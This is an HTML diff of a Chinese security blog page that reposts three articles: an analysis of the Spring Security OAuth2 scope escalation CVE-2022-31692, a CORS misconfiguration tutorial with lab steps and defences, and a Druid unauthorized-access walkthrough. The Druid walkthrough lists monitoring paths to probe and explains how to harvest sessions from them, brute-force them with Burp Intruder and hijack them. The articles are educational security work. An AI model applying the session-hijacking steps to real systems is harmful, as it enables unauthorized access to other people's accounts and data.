+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-31692-spring-security-oauth2-client权限提升漏洞">CVE-2022-31692 Spring Security Oauth2 Client权限提升漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/LJQClqjc/article/details/127676498">棱镜七彩</a> 并作补充</p>
+</blockquote>
+<h2><span id="项目介绍">项目介绍</span></h2><blockquote>
+<p>Spring Security是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。它提供了一组可以在Spring应用上下文中配置的Bean，充分利用了Spring IoC，DI（控制反转Inversion of Control ,DI:Dependency Injection 依赖注入）和AOP（面向切面编程）功能，为应用系统提供声明式的安全访问控制功能，减少了为企业系统安全控制编写大量重复代码的工作。</p>
+</blockquote>
+<h2><span id="项目地址">项目地址</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://spring.io/projects/spring-security">https://spring.io/projects/spring-security</a></p>
+</blockquote>
+<h2><span id="漏洞概述">漏洞概述</span></h2><blockquote>
+<p>Spring Security 的受影响版本中存在权限提升漏洞，攻击者可以修改客户端通过浏览器向授权服务器发出的请求，如果授权服务器在后续使用包含空作用域列表的 ’OAuth2 Access Token Response‘ 响应来获取访问token，攻击者可以获得权限提升，以特权身份执行恶意代码。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>org.springframework.security:spring-security-oauth2-client@[5.6, 5.6.9)<br>org.springframework.security:spring-security-oauth2-client@[5.7, 5.7.5)</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<ol>
+<li>下载并使用spring官方提供的<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-security-samples/tree/main/servlet/spring-boot/java/oauth2">样例</a>进行测试</li>
+<li>分别启动login和authorization-server，官方提供的authorization-server默认账号密码是user、password</li>
+</ol>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>该漏洞是一个Spring Security Oauth2的逻辑漏洞，要想明白该漏洞，我们必须先了解下什么是Oauth2。<br>简单说，OAuth2 就是一种授权机制。数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌（token），用来代替密码，供第三方应用使用。<br>OAuth 2.0 规定了四种获得令牌的流程：<br>授权码（authorization-code）<br>隐藏式（implicit）<br>密码式（password）<br>客户端凭证（client credentials）<br>授权码模式最常用，该模式的整个授权过程的时序图如下：</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>CVE-2022-31692漏洞产生的原因在于最后返回token时分配的scope不当，在spring security 中，应用向授权服务器请求token的代码如下：</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>上述标注的代码会判断AccessTokenResponse.scope是否为空，如果条件成立，则会使用当前client配置的scope。而scope代表的是令牌有权限范围。也就是说当授权服务器返回的scope为空，则客户端权限提升至最大。因此存在权限提升漏洞。<br>官方修复commit如下，分析代码可知spring security实现了三种认证模式并全部修复了漏洞。</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>三种模式的修复代码都是类似的，选其中一个分析，从修复代码可知修复后直接使用授权服务器返回的内容。</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><blockquote>
+<p>升级到最新版</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1917762">OAuth2.0究竟是个啥？看完这13张图你就明白了！ - 腾讯云开发者社区-腾讯云</a><br><a target="_blank" rel="noopener" href="https://spring.io/blog/2022/10/31/cve-2022-31690-privilege-escalation-in-spring-security-oauth2-client">CVE-2022-31690: Privilege Escalation in spring-security-oauth2-client</a><br><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-security/commit/75004587a419a96d18909030b20c6b16b226ecbe">Spring-Security Commit:Fix scope mapping</a><br><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/04/oauth_design.html">OAuth 2.0 的一个简单解释</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=KghFWdMqP_w">[iThome鐵人賽 2022] Day31 (CVE-2022-31692) Spring Security 又(?)有漏洞惹~~ 使用個 forward 功能臭了嗎?! - YouTube</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/06/CORS/">
+                跨域资源共享漏洞分析总结（含实战）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="跨源资源共享cors">跨源资源共享(CORS)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43571759/article/details/105838128">humble嘻</a> 并作补充</p>
+</blockquote>
+<h2><span id="浏览器的同源策略">浏览器的同源策略</span></h2><h3><span id="概念">概念</span></h3><blockquote>
+<p>根据字面意思就可以理解，同源策略是浏览器实施的一种关键机制，主要防止不同来源的干扰。所谓同源是指域名，协议，端口相同。<br>与其说同源策略的作用，不如说如果没有同源策略会产生什么后果，比如当你浏览网站A的同时也浏览了网站B，在该网站上运行的脚本代码将能访问你同时访问的网站B的数据和功能，此时如果网站A是恶意网站，如果网站B是网上银行，那么此时恶意站点就可以以你的名义进行转账。</p>
+</blockquote>
+<h3><span id="特点">特点</span></h3><blockquote>
+<p>位于一个域的页面可以向另一个域提出请求<br>位于一个域的页面可以加载来自其他域的脚本并在自己的域中执行这个脚本（在授权的情况下）<br>位于一个域的页面无法读取或修改属于另一个域的cookie 或者其他DOM数据</p>
+</blockquote>
+<h3><span id="主要功能">主要功能</span></h3><blockquote>
+<p>同源策略可以防止在一个域中运行的代码访问由其他域提供的内容<br>ps:但是很多功能是不受同源策略限制的：超链接、重定向、提交表单、嵌入到页面的图片等</p>
+</blockquote>
+<h2><span id="跨域">跨域</span></h2><h3><span id="主要跨域请求方法">主要跨域请求方法</span></h3><blockquote>
+<p>JSONP<br>CORS</p>
+</blockquote>
+<h3><span id="jsonp跨域">JSONP跨域</span></h3><blockquote>
+<p>加载远程js,可以把远程js中数据带进来，一笔带过，这里并不是主要学习这个的。</p>
+</blockquote>
+<h3><span id="cors跨域">CORS跨域</span></h3><blockquote>
+<p>为了实现某些功能，允许浏览器向跨域服务器发出xmlhttprequest请求，克服SOP的限制实现跨域获取数据。</p>
+</blockquote>
+<h3><span id="说明">说明</span></h3><blockquote>
+<p>最初XMLHttpRequest仅允许向与调用页面的来源相同的来源提出请求。随着HTML5的出现，这一技术得以修改，从而可以与其他域进行交互。</p>
+</blockquote>
+<h3><span id="举例说明">举例说明</span></h3><blockquote>
+<p>首先看个实例说明一下，刚好我在逛b站，就随手抓了一个包—-如图<br><img src="/2023/10/06/CORS/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>请求头中的Origin字段<br>其中红色框框的origin字段表明该请求来源于<a target="_blank" rel="noopener" href="https://message.bilibili.com/">https://message.bilibili.com</a><br>需要跨域请求时，浏览器会添加origin消息头，用于指示尝试提出跨域请求的域，对服务端来说，这个字段即是跨域标志。<br>当浏览器收到请求并收到这个字段，首先就会判断这个源是否在允许范围之内，如果是，也就出现了下面介绍的这些字段。</p>
+</blockquote>
+<blockquote>
+<p>响应包中的4个响应字段<br>Access-Control-Allow-Origin字段在这里表示接受该域名的请求，有些情况会是 * 此时也就存在了安全风险。<br>Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。当设置为true时，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。默认是false。<br>Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。<br>Access-Control-Allow-Methods: 允许使用的请求方法</p>
+</blockquote>
+<h2><span id="cors的安全问题">CORS的安全问题</span></h2><blockquote>
+<p>造成安全原因同样也是不安去的配置导致的，唉，不安全的配置会导致各种各样的漏洞，这也是这种缺陷一直位于owaspTop10的原因。<br>简单易懂的举个例子就是foo.com向bar.com发出请求时，如果响应头中包含了foo.com的CORS头，这样foo.com就可以携带cookie去调用bar.com了。</p>
+</blockquote>
+<h2><span id="三种不安全的配置引起的安全问题">三种不安全的配置引起的安全问题</span></h2><blockquote>
+<p>CORS服务端的 Access-Control-Allow-Origin 设置为了 * ,也就是说允许任何网站访问本服务器的资源。毫无疑问这是存在安全风险的<br>这里做一个实验，是一个在线实验室，就是针对这一类漏洞，如图<br><img src="/2023/10/06/CORS/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>出现一个登入界面，使用提供给你的用户密码登入进去，点击我的账户，会发现会提供给你一个api key,并且这个服务器对跨域请求进行了不安全的配置，也就是上文提到的，这里只需要在请求头中添加Origin字段–如图<br><img src="/2023/10/06/CORS/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>响应消息头中当然是不合法的，这个实验室同时也提供了可以利用的服务器，通过这个服务器获得本服务器的API<br>进入可利用服务器，向受害者服务器提出跨域请求，如图<br><img src="/2023/10/06/CORS/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>完成攻击后，查看访问日志发现已经完成攻击。<br><img src="/2023/10/06/CORS/5.png" alt="image"><br>还有一种漏洞是由于白名单的空原始值，请求消息头为Origin: null，某些应用程序可能会将null来源列入白名单，以支持应用程序的本地开发，这个实验内容和本实验类似。</p>
+</blockquote>
+<blockquote>
+<p>返回报文头部Access-Control-Allow-Origin由请求报文Origin生成的（客户端可控数据），并且返回报文Access-Control-Allow-Credentials&#x3D;true时，表明cookie可以包含在请求头中，一起发给服务器<br>配置了不严谨的正则表达式规则，也就是说对origin校验功能不完善，比如一种情况是只检查以a.com结尾的网站域名</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">origin:http:<span class="comment">//a.com</span></span><br><span class="line">Access-Control-Allow-Origin:http:<span class="comment">//a.com</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以构造一个类似<a target="_blank" rel="noopener" href="http://b.a.com/">http://b.a.com</a> 就能绕过其验证机制导致信息泄露，有些情况也会导致HTTP拆分注入攻击。</p>
+</blockquote>
+<h3><span id="通过cors信任关系-利用xss">通过CORS信任关系 利用XSS</span></h3><blockquote>
+<p>甚至“正确”配置的CORS也会在两个来源之间建立信任关系。如果网站信任易受跨站点脚本（XSS）攻击的来源，则攻击者可能利用XSS注入一些JavaScript，这些JavaScript使用CORS从信任易受攻击的应用程序的站点检索敏感信息。<br>开发人员用于对抗CORS利用的一种防御机制，是将频繁请求访问信息的域列入白名单。但这并不完全安全，因为只要白名单域中的一个子域易受到其他攻击（如XSS），那么也可以进行CORS利用。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/10584677.html">这篇文章有几个实例和漏洞分析可以看看</a></p>
+</blockquote>
+<h3><span id="使用错误的cors破坏tls">使用错误的CORS破坏TLS</span></h3><blockquote>
+<p>假设严格使用HTTPS的应用程序还将使用纯HTTP的受信任子域列入白名单。例如，当应用程序收到以下请求时：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/requestApiKey</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://trusted-subdomain.vulnerable-website.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionid=...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该应用程序响应：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://trusted-subdomain.vulnerable-website.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用CORS配置破坏受害者与应用程序的交互。该攻击包括以下步骤：<br>受害用户发出任何普通的HTTP请求。<br>攻击者将重定向注入到： <a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com/">http://trusted-subdomain.vulnerable-website.com</a><br>受害者的浏览器遵循重定向。<br>攻击者拦截原始的HTTP请求，然后将包含CORS请求的欺骗响应返回给： <a target="_blank" rel="noopener" href="https://vulnerable-website.com/">https://vulnerable-website.com</a><br>受害者的浏览器发出CORS请求，包括来源： <a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com/">http://trusted-subdomain.vulnerable-website.com</a><br>该应用程序允许该请求，因为这是白名单来源。请求的敏感数据将在响应中返回。<br>攻击者的欺骗页面可以读取敏感数据，并将其传输到攻击者控制下的任何域。<br>即使易受攻击的网站对HTTPS的使用具有鲁棒性，没有HTTP终结点并且所有cookie被标记为安全，此攻击也有效。</p>
+</blockquote>
+<h2><span id="防御cors">防御CORS</span></h2><h3><span id="如何预防基于cors的攻击">如何预防基于CORS的攻击</span></h3><blockquote>
+<p>CORS漏洞主要是由于配置错误而引起的。因此，预防是一个配置问题。以下各节介绍了一些针对CORS攻击的有效防御措施。</p>
+</blockquote>
+<h3><span id="正确配置跨域请求">正确配置跨域请求</span></h3><blockquote>
+<p>如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。</p>
+</blockquote>
+<h3><span id="只允许信任的网站">只允许信任的网站</span></h3><blockquote>
+<p>看起来似乎很明显，但是Access-Control-Allow-Origin标头中指定的来源只能是受信任的站点。特别是，无需验证就可以动态反映跨域请求的来源而无需验证，因此应避免使用。</p>
+</blockquote>
+<h3><span id="避免将null列入白名单">避免将null列入白名单</span></h3><blockquote>
+<p>避免使用标题Access-Control-Allow-Origin: null。来自内部文档和沙盒请求的跨域资源调用可以指定null来源。应针对私有和公共服务器的可信来源正确定义CORS标头。</p>
+</blockquote>
+<h3><span id="避免在内部网络中使用通配符">避免在内部网络中使用通配符</span></h3><blockquote>
+<p>避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。</p>
+</blockquote>
+<h3><span id="cors不能替代服务器端安全策略">CORS不能替代服务器端安全策略</span></h3><blockquote>
+<p>CORS定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的CORS之外，Web服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。</p>
+</blockquote>
+<h2><span id="实验室和参考">实验室和参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/CORS/" rel="tag">CORS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/06/Druid-Session/">
+                Druid未授权访问利用
+            </a>
+        </h2>
+    
+    <time>
+        Oct 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="druid未授权访问利用">Druid未授权访问利用</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/chest_/article/details/109695524">春日野穹</a> 并作补充</p>
+</blockquote>
+<h2><span id="引言">引言</span></h2><blockquote>
+<p>最近挖SRC经常遇到Druid未授权访问漏洞，觉得过程比较有趣，所以简单记录一下</p>
+</blockquote>
+<h2><span id="druid简介">Druid简介</span></h2><blockquote>
+<p>druid是阿里研发的一款数据库连接池，其开发语言为java，druid集合了c3p0、dbcp、proxool等连接池的优点，还加入了日志监控、session监控等数据监控功能，使用Druid能有效的监控DB池连接和SQL的执行情况。<br>更多信息可参考官方GitHub项目：<a target="_blank" rel="noopener" href="https://github.com/alibaba/druid">https://github.com/alibaba/druid</a><br>druid虽高效好用，但当开发者配置不当时就可能造成未授权访问，攻击者可利用泄露的Session登录后台</p>
+</blockquote>
+<h2><span id="druid未授权访问路径">Druid未授权访问路径</span></h2><blockquote>
+<p>怎么探寻Druid未授权访问呢？可以直接拼接以下路径进行访问，如果页面存在，即为Druid未授权访问</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">ip/druid/index.html 		 	##Druid Index</span><br><span class="line">ip/druid/sql.html				##Druid sql监控页面</span><br><span class="line">ip/druid/weburi.html			##Druid Web URI监控页面</span><br><span class="line">ip/druid/websession.html		##Druid Web Session监控页面</span><br><span class="line"></span><br><span class="line">json:</span><br><span class="line">ip/druid/weburi.json			##Druid Web URI json</span><br><span class="line">ip/druid/websession.json		##Druid Web Session json</span><br><span class="line"></span><br><span class="line">Druid 登录接口：</span><br><span class="line">ip/druid/login.html				##Druid登录认证页面</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当一级目录不存在时，可尝试拼接二级目录进行访问<br>也可利用谷歌语法或目录扫描工具进行探测：<br><img src="/2023/10/06/Druid-Session/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="提取session">提取session</span></h2><blockquote>
+<p>访问ip&#x2F;druid&#x2F;weburi.html看到以下页面则证明漏洞可被利用，如果url和session页面都为空，则说明这两项druid并不管理<br><img src="/2023/10/06/Druid-Session/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>当&#x2F;druid&#x2F;websession.html页面存在数据时，我们可利用该页面的session伪造登录，点击最后访问时间，然后复制一条离现在时间最为接近的session进行伪造登录；之所以要点击最后访问时间排序session，是因为此处记录的Session并非全部都是用户在线时的session，当用户退出系统时，session虽然还存在，但已失效，无法再利用。<br>也可利用py提取session然后结合burp的Intruder模块批量遍历高权限用户，session地址可参考上面给出的链接<br><img src="/2023/10/06/Druid-Session/3.png" alt="image"></p>
+<p>如果我们并不清楚后台的位置，我们可再把脚本改一下，利用url监控处为我们提供清晰的站点目录架构<br><img src="/2023/10/06/Druid-Session/4.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>ok，得到后台地址，接下来我们访问一下<br><img src="/2023/10/06/Druid-Session/5.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>重新刷新一下页面，然后开启burp进行抓包，抓包过程中发现站点cookie值存在session字段，点击最后访问时间排序一下session，随后复制session过来访问一下<br><img src="/2023/10/06/Druid-Session/6.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>毫无意外，成功进去，但是权限不高，看来还是得开启神奇的Intruder模块，爆破结果如下<br><img src="/2023/10/06/Druid-Session/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>根据返回包信息看哪条session权限高就用它伪造登录<br>注：除session伪造外，url监控和sql监控也能为我们开拓攻击的思路，当我们遇到一个注入且不清楚其语法结构时，查看sql监控处有可能会得到，此外，url监控处也为我们提供了较为清晰的站点目录架构</p>
+</blockquote>
+<h2><span id="session伪造进后台">session伪造进后台</span></h2><blockquote>
+<p>之后就是替换cookie值伪造登录了，f12改一下session值即可<br><img src="/2023/10/06/Druid-Session/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="结语">结语</span></h2><blockquote>
+<p>druid作为数据源的一名后起之秀，凭借其出色的性能，渐渐被大家使用。当然还有他的监控页面也有这非常大的作用。但是监控页面往往包含了很多隐私的数据信息，所以需要将其保密，可以为监控页面添加一个用户名和密码，确保其安全性</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Druid/" rel="tag">Druid</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -801,6 +794,11 @@
       <span class="text">Previous</span>
     </a>
     
+    
+    <a class="next" rel="next" href="/tags/Reprint/page/6/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
     
   </nav>
 
